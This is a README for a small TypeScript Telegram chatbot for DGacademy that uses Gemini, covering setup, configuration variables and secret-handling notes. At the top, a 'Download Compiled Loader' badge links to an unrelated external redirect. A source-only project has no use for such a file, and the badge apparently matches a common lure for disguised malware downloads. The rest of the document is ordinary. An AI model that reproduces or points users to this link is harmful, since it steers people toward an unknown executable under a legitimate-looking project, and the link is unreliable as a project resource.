# DGacademy Telegram Chatbot

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A small TypeScript Telegram chatbot for DGacademy. It runs as a simple long-polling bot and uses Gemini for replies.

## Features

- `/start`, `/help`, `/about`, `/courses`, and `/reset` commands
- Gemini-powered replies using DGacademy context
- Same-language replies when possible
- Short per-chat memory for more natural conversations

## Setup

1. Copy the environment template:

   ```powershell
   Copy-Item .env.example .env
   ```

2. Edit `.env` and add:

   ```text
   TELEGRAM_BOT_TOKEN=your_token_here
   GEMINI_API_KEY=your_key_here
   ```

3. Install dependencies:

   ```powershell
   npm install
   ```

4. Run the bot in development:

   ```powershell
   npm run dev
   ```

The process must stay running for the bot to respond.

For a long-running host like Render, use:

```text
Build Command: bun install
Start Command: bun run start
```

## Configuration

| Variable | Description | Default |
| --- | --- | --- |
| `TELEGRAM_BOT_TOKEN` | Telegram Bot API token | Required |
| `GEMINI_API_KEY` | Google Gemini API key | Required |
| `GEMINI_MODEL` | Gemini model name | `gemini-2.5-flash` |
| `DGACADEMY_ADMIN_CONTACT` | Optional admin contact text | Empty |
| `TELEGRAM_POLL_TIMEOUT` | Long-poll timeout in seconds | `30` |

## Security Note

The Telegram bot token and Gemini API key should be treated as secrets. If either key was shared in a chat, document, screenshot, or public repo, rotate it before production use.

## Production Notes

- Keep `.env` out of version control.
- Use `/reset` in Telegram to clear the current chat memory.
- Conversation memory is stored in the running process. For durable memory, add Redis or a database.
